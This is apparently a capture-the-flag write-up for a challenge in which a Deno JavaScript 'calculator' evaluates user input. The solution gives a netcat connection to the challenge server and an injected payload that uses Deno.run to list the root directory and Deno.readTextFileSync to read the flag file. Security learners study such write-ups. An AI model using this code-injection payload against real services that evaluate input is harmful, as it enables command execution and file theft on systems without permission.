# Denis JS (old)

## Question

Author: Dimas & ayapi

Hello guys, Denis just make a simple calculator in js, can you try it?

## Solution

```nc ctf.tcp1p.team <Port>```

```js
Deno["run"]({ cmd: ["ls", "-la", "/"], stdout: "piped" }).output().then(output => { console.log(new TextDecoder().decode(output));});


console.log(Deno.readTextFileSync("/flag-af9bc2b0e080a36f66549ba2d790529e"));
```
